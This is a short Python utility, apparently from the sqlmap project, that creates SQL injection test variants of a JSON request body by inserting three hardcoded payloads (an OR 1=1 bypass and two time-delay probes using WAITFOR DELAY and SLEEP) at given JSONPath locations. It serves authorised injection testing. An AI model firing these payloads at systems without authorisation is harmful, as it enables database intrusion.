#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import json
import sys
import os

# Add parent directory to sys.path to allow importing from lib/extra
sys.path.insert(0, os.path.join(os.path.dirname(os.path.realpath(__file__)), ".."))

from lib.core.common import parseJson
from thirdparty.jsonpath_ng import parse as parse_jsonpath

def generate_payloads(json_template, paths_to_test):
    """
    Generates fuzzed versions of a JSON template for specified paths.
    """
    data = parseJson(json_template)
    if not data:
        print("[-] Invalid JSON template")
        return

    payloads = []
    for path in paths_to_test:
        try:
            expr = parse_jsonpath(path)
            # Simple SQL injection payloads for testing
            for sql_payload in ["' OR 1=1--", "1' WAITFOR DELAY '0:0:5'--", "1 AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)"]:
                test_data = json.loads(json_template) # Fresh copy
                expr.update(test_data, sql_payload)
                payloads.append({
                    "path": path,
                    "payload": sql_payload,
                    "json": json.dumps(test_data)
                })
        except Exception as ex:
            print("[-] Error processing path %s: %s" % (path, str(ex)))

    return payloads

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python payload_gen.py '<json_template>' '<path1>,<path2>,...'")
        sys.exit(1)

    template = sys.argv[1]
    paths = sys.argv[2].split(",")

    results = generate_payloads(template, paths)
    if results:
        print(json.dumps(results, indent=4))
